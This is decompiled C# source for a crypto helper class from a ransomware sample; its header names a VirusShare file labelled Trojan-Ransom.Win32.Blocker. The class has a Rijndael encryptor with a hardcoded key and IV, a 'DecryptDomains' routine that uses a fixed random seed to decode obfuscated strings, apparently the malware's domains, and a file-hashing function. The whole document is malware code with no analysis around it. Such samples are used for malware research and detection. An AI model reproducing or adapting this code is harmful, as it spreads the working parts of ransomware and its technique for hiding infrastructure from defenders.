// Decompiled with JetBrains decompiler
// Type: n3ux.Crypto
// Assembly: flu-nucleo, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 807F4FF6-398F-45B5-8EC1-50AF57383C19
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00050-msil\Trojan-Ransom.Win32.Blocker.avxv-c9e0300c4b5a251c76c291f23c0d27537f89d4b9.exe

using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace n3ux
{
  internal class Crypto
  {
    public static string EncryptRijndael(string text)
    {
      byte[] bytes1 = Encoding.ASCII.GetBytes("qazwsxedcrfvtgb");
      byte[] bytes2 = Encoding.ASCII.GetBytes("qazwsxedcrfvtgb");
      byte[] bytes3 = Encoding.ASCII.GetBytes(text);
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
      byte[] array;
      using (MemoryStream memoryStream = new MemoryStream(bytes3.Length))
      {
        using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndaelManaged.CreateEncryptor(bytes1, bytes2), CryptoStreamMode.Write))
        {
          cryptoStream.Write(bytes3, 0, bytes3.Length);
          cryptoStream.FlushFinalBlock();
          cryptoStream.Close();
        }
        array = memoryStream.ToArray();
      }
      return Convert.ToBase64String(array);
    }

    public static string DecryptDomains(string text)
    {
      string empty = string.Empty;
      Random random = new Random(1646475713);
      string str = text;
      char[] chArray = new char[1]{ '~' };
      foreach (string s in str.Split(chArray))
      {
        int num = int.Parse(s) / random.Next(10000);
        empty += Convert.ToChar(num).ToString();
      }
      return empty;
    }

    public static string getSignature(string filename, string algorithm)
    {
      HashAlgorithm hashAlgorithm = HashAlgorithm.Create(algorithm);
      FileStream inputStream = System.IO.File.OpenRead(filename);
      byte[] hash = hashAlgorithm.ComputeHash((Stream) inputStream);
      inputStream.Close();
      return BitConverter.ToString(hash).Replace("-", "");
    }
  }
}
